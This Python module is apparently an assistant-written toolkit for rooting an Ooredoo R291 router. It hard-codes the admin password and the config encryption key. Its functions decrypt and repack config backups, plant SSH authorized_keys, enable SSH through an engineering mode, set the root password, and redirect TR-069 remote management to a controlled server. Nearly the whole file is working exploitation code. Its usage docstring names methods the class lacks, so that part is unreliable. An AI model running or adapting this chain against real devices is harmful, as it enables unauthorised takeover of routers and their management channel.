#!/usr/bin/env python3
"""
R291 Ooredoo Router — API & Access Toolkit
==========================================
A unified module for interacting with the router's APIs and exploiting its features.

What we've learned so far (Key Findings):
------------------------------------------

1. ENCRYPTION KEY:
   - Config files: openssl enc -aes-128-cbc -md sha256 -pass pass:GYtAlIZh
   - Encrypted with "Salted__" prefix

2. CONFIG RESTORE BEHAVIOR:
   - The router ONLY extracts files under /etc/config/ from the uploaded tar.gz
   - Files placed in /etc/dropbear/ are SILENTLY IGNORED
   - The restore script runs: tar xzvf /tmp/MTK_cfg.tar.gz -C / etc/config

3. DROPBEAR LIMITATIONS:
   - The dropbear binary (/usr/sbin/dropbear_2016.74) checks /etc/dropbear/authorized_keys
   - The init.d script IGNORES "AuthorizedKeysFile" UCI option
   - set_dropbear_info API with key_type=99 (default, seems to not persist other values)

4. UBUSD ACCESS:
   - Available objects: system.info, system.board, system.status
   - service.list works (shows running processes)
   - system.exec returns empty strings (exec capability seems limited)
   - file.read/list return error_cause=3 (not available)

5. AUTHENTICATION:
   - HTTP Digest auth via login.cgi
   - WebUI password: Om@0Yt#5
   - set_dropbear_info sets root password (but doesn't seem to persist)

6. TR069 ENDPOINT:
   - tr069 config file exists in /etc/config/tr069
   - May provide command injection or remote command execution

Usage:
    from api_toolkit import RouterAPI
    api = RouterAPI()
    api.login()
    api.download_config()
    api.upload_config('path/to/encrypted.tar.gz')
    api.reboot()
"""

import hashlib
import http.client
import os
import random
import ssl
import subprocess
import sys
import tarfile
import tempfile
import shutil
import time
import socket
import json
from typing import Optional, Dict, Any, List

import requests
from requests.auth import HTTPDigestAuth

requests.packages.urllib3.disable_warnings()

# --- Constants ---
ROUTER_IP = "192.168.1.1"
ROUTER_URL = f"http://{ROUTER_IP}"
HTTPS_URL = f"https://{ROUTER_IP}"
USER = "admin"
PASS = "Om@0Yt#5"
ENCRYPTION_PASSWORD = "GYtAlIZh"
SSH_KEY_DIR = os.path.expanduser("~/.ssh")

sess = requests.Session()
sess.verify = False
sess.timeout = 15

CGISID: Optional[str] = None
_nc_counter = 0


# =====================================================================
# LOGIN & AUTHENTICATION
# =====================================================================

def get_auth_params() -> Dict[str, str]:
    """Get Digest auth parameters from login.cgi"""
    r = sess.get(f"{ROUTER_URL}/login.cgi", timeout=10)
    ah = r.headers.get("WWW-Authenticate", "")
    p = {}
    for part in ah.replace("Digest ", "").split(", "):
        k, v = part.split("=", 1)
        p[k] = v.strip('"')
    return p


def login() -> bool:
    """Perform HTTP Digest authentication"""
    global CGISID, _nc_counter
    _nc_counter = 0
    try:
        p = get_auth_params()
        ha1 = hashlib.md5(f"{USER}:{p['realm']}:{PASS}".encode()).hexdigest()
        ha2 = hashlib.md5("GET:/cgi/xml_action.cgi".encode()).hexdigest()
        salt = str(random.randint(0, 100000)) + str(int(time.time() * 1000))
        cn = hashlib.md5(salt.encode()).hexdigest()[:16]
        nc = "00000001"
        resp = hashlib.md5(f"{ha1}:{p['nonce']}:{nc}:{cn}:{p['qop']}:{ha2}".encode()).hexdigest()
        url = (f"{ROUTER_URL}/login.cgi?Action=Digest&username={USER}&realm={p['realm']}"
               f"&nonce={p['nonce']}&response={resp}&qop={p['qop']}&cnonce={cn}&nc={nc}&temp=marvell")
        r = sess.get(url, timeout=10)
        if "CGISID:" in r.text:
            CGISID = r.text.split("CGISID:")[1].strip().split("\r")[0].split("\n")[0]
            return True
        c = sess.cookies.get("CGISID")
        if c:
            CGISID = c
            return True
    except Exception as e:
        print(f"Login error: {e}")
    return False


def make_auth(method="POST", uri="/cgi/xml_action.cgi") -> str:
    """Generate Digest auth header"""
    global _nc_counter
    _nc_counter += 1
    p = get_auth_params()
    ha1 = hashlib.md5(f"{USER}:{p['realm']}:{PASS}".encode()).hexdigest()
    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
    salt = str(random.randint(0, 100000)) + str(int(time.time() * 1000))
    cn = hashlib.md5(salt.encode()).hexdigest()[:16]
    nc = f"{_nc_counter:08d}"
    resp = hashlib.md5(f"{ha1}:{p['nonce']}:{nc}:{cn}:{p['qop']}:{ha2}".encode()).hexdigest()
    return (f'Digest username="{USER}", realm="{p["realm"]}", nonce="{p["nonce"]}", '
            f'uri="{uri}", response="{resp}", qop={p["qop"]}, nc={nc}, cnonce="{cn}"')


# =====================================================================
# CONFIG DOWNLOAD & UPLOAD
# =====================================================================

def download_config(output_path: str = "/tmp/router_config.bin") -> bool:
    """Download config backup from router"""
    auth = make_auth("POST")
    headers = {
        'Authorization': auth,
        'Cookie': f'CGISID={CGISID}',
        'Referer': f'{ROUTER_URL}/',
    }
    url = f'{ROUTER_URL}/xml_action.cgi?Action=Download&file=backup_config'
    r = sess.post(url, headers=headers, timeout=30)
    
    with open(output_path, 'wb') as f:
        f.write(r.content)
    
    print(f"[+] Downloaded config ({len(r.content)} bytes) to {output_path}")
    return True


def decrypt_config(encrypted_path: str, output_path: str = "/tmp/router_config.tar.gz") -> bool:
    """Decrypt router config using AES-128-CBC"""
    result = subprocess.run([
        'openssl', 'enc', '-d', '-aes-128-cbc', '-md', 'sha256',
        '-in', encrypted_path, '-out', output_path,
        '-pass', f'pass:{ENCRYPTION_PASSWORD}'
    ], capture_output=True, text=True)
    
    if result.returncode != 0:
        print(f"[-] Decryption failed: {result.stderr}")
        return False
    
    print(f"[+] Decrypted config to {output_path}")
    return True


def upload_config(encrypted_config_path: str) -> Dict[str, Any]:
    """Upload modified config using multipart/form-data (matching browser format)"""
    auth = make_auth("POST")
    headers = {
        'Authorization': auth,
        'Cookie': f'CGISID={CGISID}',
        'Referer': f'{ROUTER_URL}/',
        'Origin': f'{ROUTER_URL}',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    }
    
    url = f'{ROUTER_URL}/xml_action.cgi?Action=Upload&file=restore_config&command='
    boundary = '----geckoformboundary4c64f4d6130ed3c31a61595cb20093b1'
    
    with open(encrypted_config_path, 'rb') as f:
        file_data = f.read()
    
    body = (
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="config_backup.bin"; filename="config_backup.bin.decrypted.tar.gz"\r\n'
        f'Content-Type: application/gzip\r\n'
        f'\r\n'
    ).encode() + file_data + f'\r\n--{boundary}--\r\n'.encode()
    
    headers['Content-Type'] = f'multipart/form-data; boundary={boundary}'
    
    response = sess.post(url, data=body, headers=headers, timeout=30)
    
    result = {
        "status": response.status_code,
        "body": response.text,
        "success": response.status_code == 200 and 'error' not in response.text.lower()
    }
    
    # Check for key files in response
    if 'authorized_keys' in response.text:
        result["authorized_keys_detected"] = True
    if 'dropbear' in response.text:
        result["dropbear_processed"] = True
    
    return result


# =====================================================================
# REBOOT & DEVICE CONTROL
# =====================================================================

def reboot() -> Dict[str, Any]:
    """Reboot the router via API"""
    auth = make_auth("POST")
    xml = ('<?xml version="1.0" encoding="US-ASCII"?>'
           '<RGW><param><method>call</method><session>000</session>'
           '<obj_path>router</obj_path><obj_method>router_call_reboot</obj_method>'
           '</param></RGW>')
    
    url = f'{ROUTER_URL}/xml_action.cgi?method=set'
    headers = {
        'Authorization': auth,
        'Cookie': f'CGISID={CGISID}',
        'Referer': f'{ROUTER_URL}/',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    
    r = sess.post(url, data=xml, headers=headers, timeout=15)
    return {"status": r.status_code, "response": r.text}


def enable_eng_mode(mode: str = "2") -> Dict[str, Any]:
    """Enable engineering mode (mode=2 enables SSH after reboot)"""
    auth = make_auth("POST")
    xml = ('<?xml version="1.0" encoding="US-ASCII"?>'
           '<RGW><param><method>call</method><session>000</session>'
           '<obj_path>cm</obj_path><obj_method>set_eng_mode</obj_method>'
           '</param>'
           '<wan><mode>%s</mode></wan></RGW>' % mode)
    
    url = f'{ROUTER_URL}/xml_action.cgi?method=set'
    headers = {
        'Authorization': auth,
        'Cookie': f'CGISID={CGISID}',
        'Referer': f'{ROUTER_URL}/',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    
    r = sess.post(url, data=xml, headers=headers, timeout=15)
    return {"status": r.status_code, "response": r.text}


def set_dropbear_info(mode: str = "1", user: str = "root", password: str = "", key_type: str = "99") -> Dict[str, Any]:
    """Set dropbear SSH info (WARNING: may cause watchdog reboot)"""
    auth = make_auth("POST")
    xml = ('<?xml version="1.0" encoding="US-ASCII"?>'
           '<RGW><param><method>call</method><session>000</session>'
           '<obj_path>router</obj_path><obj_method>set_dropbear_info</obj_method>'
           '</param>'
           '<dropbear_info>'
           f'<dropbear_mode>{mode}</dropbear_mode>'
           f'<dropbear_user>{user}</dropbear_user>'
           f'<dropbear_password>{password}</dropbear_password>'
           f'<dropbear_key_type>{key_type}</dropbear_key_type>'
           '</dropbear_info></RGW>')
    
    url = f'{ROUTER_URL}/xml_action.cgi?method=set'
    headers = {
        'Authorization': auth,
        'Cookie': f'CGISID={CGISID}',
        'Referer': f'{ROUTER_URL}/',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    
    r = sess.post(url, data=xml, headers=headers, timeout=15)
    return {"status": r.status_code, "response": r.text}


def wait_for_reboot(timeout: int = 180) -> Dict[str, Any]:
    """Wait for router to come back after reboot"""
    start = time.time()
    for i in range(timeout):
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((ROUTER_IP, 22))
            data = s.recv(100)
            s.close()
            if b'SSH' in data:
                elapsed = time.time() - start
                return {"success": True, "elapsed": elapsed}
        except:
            pass
        time.sleep(1)
    return {"success": False, "elapsed": timeout}


# =====================================================================
# UBUSD API CALL
# =====================================================================

def api_call(obj_path: str, obj_method: str, params: dict = None) -> str:
    """Make an authenticated ubus API call"""
    auth = make_auth("POST")
    xml = '<?xml version="1.0" encoding="US-ASCII"?><RGW>'
    xml += '<param><method>call</method><session>000</session>'
    xml += f'<obj_path>{obj_path}</obj_path><obj_method>{obj_method}</obj_method>'
    xml += '</param>'
    if params:
        xml += f'<{obj_path}>'
        for k, v in params.items():
            xml += f'<{k}>{v}</{k}>'
        xml += f'</{obj_path}>'
    xml += '</RGW>'
    
    url = f'{ROUTER_URL}/xml_action.cgi?method=set'
    headers = {
        'Authorization': auth,
        'Cookie': f'CGISID={CGISID}',
        'Referer': f'{ROUTER_URL}/',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    
    r = sess.post(url, data=xml, headers=headers, timeout=15)
    return r.text


# =====================================================================
# KEY MANAGEMENT
# =====================================================================

def generate_ssh_key(key_name: str = "id_rsa_modified") -> str:
    """Generate SSH key pair if it doesn't exist"""
    key_path = os.path.join(SSH_KEY_DIR, key_name)
    pub_path = key_path + ".pub"
    
    if os.path.exists(pub_path):
        with open(pub_path, 'r') as f:
            return f.read().strip()
    
    os.makedirs(SSH_KEY_DIR, exist_ok=True)
    subprocess.run(['ssh-keygen', '-t', 'rsa', '-b', '2048', '-f', key_path, '-N', ''], check=True)
    
    with open(pub_path, 'r') as f:
        return f.read().strip()


def add_ssh_key_to_config(config_dir: str) -> bool:
    """Add SSH key to config at /etc/config/authorized_keys"""
    pubkey = generate_ssh_key()
    
    # Place key in /etc/config/authorized_keys (router only processes /etc/config/)
    ak_path = os.path.join(config_dir, 'etc', 'config', 'authorized_keys')
    os.makedirs(os.path.dirname(ak_path), exist_ok=True)
    with open(ak_path, 'w') as f:
        f.write(pubkey + '\n')
    os.chmod(ak_path, 0o600)
    
    # Modify dropbear config to point to this path
    dropbear_conf = os.path.join(config_dir, 'etc', 'config', 'dropbear')
    if os.path.exists(dropbear_conf):
        with open(dropbear_conf, 'r') as f:
            content = f.read()
        content = content.replace('/etc/dropbear/authorized_keys', '/etc/config/authorized_keys')
        with open(dropbear_conf, 'w') as f:
            f.write(content)
    
    return True


# =====================================================================
# TR069 EXPLOITATION
# =====================================================================

def get_tr069_config() -> str:
    """Retrieve the tr069 configuration from the router"""
    auth = make_auth("POST")
    headers = {
        'Authorization': auth,
        'Cookie': f'CGISID={CGISID}',
        'Referer': f'{ROUTER_URL}/',
    }
    url = f'{ROUTER_URL}/xml_action.cgi?Action=Download&file=backup_config'
    r = sess.post(url, headers=headers, timeout=30)
    
    with open('/tmp/tr069_check.bin', 'wb') as f:
        f.write(r.content)
    
    subprocess.run([
        'openssl', 'enc', '-d', '-aes-128-cbc', '-md', 'sha256',
        '-in', '/tmp/tr069_check.bin',
        '-out', '/tmp/tr069_check.tar.gz',
        '-pass', f'pass:{ENCRYPTION_PASSWORD}'
    ], check=True, capture_output=True)
    
    if os.path.exists('/tmp/tr069_extract'):
        shutil.rmtree('/tmp/tr069_extract')
    os.makedirs('/tmp/tr069_extract')
    with tarfile.open('/tmp/tr069_check.tar.gz', 'r:gz') as tar:
        tar.extractall('/tmp/tr069_extract')
    
    tr069_path = '/tmp/tr069_extract/etc/config/tr069'
    if os.path.exists(tr069_path):
        with open(tr069_path) as f:
            return f.read()
    return ""


def modify_tr069_to_local_server(local_ip: str, local_port: int = 7547) -> bool:
    """
    Modify TR069 (CWMP) settings to point to a local server we control.
    This is the approach suggested by the user.
    """
    # Download current config
    auth = make_auth("POST")
    headers = {
        'Authorization': auth,
        'Cookie': f'CGISID={CGISID}',
        'Referer': f'{ROUTER_URL}/',
    }
    url = f'{ROUTER_URL}/xml_action.cgi?Action=Download&file=backup_config'
    r = sess.post(url, headers=headers, timeout=30)
    
    with open('/tmp/tr069_cfg.bin', 'wb') as f:
        f.write(r.content)
    
    subprocess.run([
        'openssl', 'enc', '-d', '-aes-128-cbc', '-md', 'sha256',
        '-in', '/tmp/tr069_cfg.bin',
        '-out', '/tmp/tr069_cfg.tar.gz',
        '-pass', f'pass:{ENCRYPTION_PASSWORD}'
    ], check=True, capture_output=True)
    
    if os.path.exists('/tmp/tr069_workdir'):
        shutil.rmtree('/tmp/tr069_workdir')
    os.makedirs('/tmp/tr069_workdir')
    with tarfile.open('/tmp/tr069_cfg.tar.gz', 'r:gz') as tar:
        tar.extractall('/tmp/tr069_workdir')
    
    # Read and modify tr069 config
    tr069_path = '/tmp/tr069_workdir/etc/config/tr069'
    if not os.path.exists(tr069_path):
        print("[-] No tr069 config found")
        return False
    
    with open(tr069_path, 'r') as f:
        content = f.read()
    
    print(f"[+] Original tr069 config:\n{content}")
    
    # Modify to point to our server
    content = content.replace('cwmp.url', f'cwmp.url {local_ip}:{local_port}')
    
    with open(tr069_path, 'w') as f:
        f.write(content)
    
    print(f"[+] Modified tr069 config:\n{content}")
    
    # Re-pack and encrypt
    final_tar_gz = "/tmp/tr069_mod.tar.gz"
    with tarfile.open(final_tar_gz, 'w:gz') as tar:
        tar.add('/tmp/tr069_workdir/etc', arcname='etc')
    
    final_enc = "/tmp/tr069_mod_enc.tar.gz"
    subprocess.run([
        'openssl', 'enc', '-aes-128-cbc', '-md', 'sha256',
        '-salt', '-in', final_tar_gz,
        '-out', final_enc,
        '-pass', f'pass:{ENCRYPTION_PASSWORD}'
    ], check=True, capture_output=True)
    
    print(f"[+] Created modified tr069 config at {final_enc}")
    return True


# =====================================================================
# MAIN EXECUTION
# =====================================================================

class RouterAPI:
    """High-level API for router interaction"""
    
    def __init__(self):
        self.cgismd = None
    
    def connect(self) -> bool:
        return login()
    
    def get_system_info(self) -> str:
        return api_call('system', 'info')
    
    def get_board_info(self) -> str:
        return api_call('system', 'board')
    
    def get_service_list(self) -> str:
        return api_call('service', 'list')
    
    def get_dropbear_info(self) -> str:
        return api_call('router', 'get_dropbear_info')
    
    def get_eng_mode(self) -> str:
        """Get engineering mode status"""
        r = api_call('cm', 'get_eng_mode')
        return r


if __name__ == "__main__":
    api = RouterAPI()
    if api.connect():
        print(f"[+] Connected to router at {ROUTER_IP}")
        print(f"[+] CGISID: {CGISID[:20]}...")
        
        print("\n[1] System Info:")
        print(api.get_system_info()[:300])
        
        print("\n[2] Board Info:")
        print(api.get_board_info()[:300])
        
        print("\n[3] Eng Mode:")
        print(api.get_eng_mode())
        
        print("\n[4] Dropbear Info:")
        print(api.get_dropbear_info()[:200])
        
        print("\n[5] TR069 Config:")
        tr069 = get_tr069_config()
        print(tr069[:500] if tr069 else "No tr069 config found")
    else:
        print("[-] Failed to connect to router")
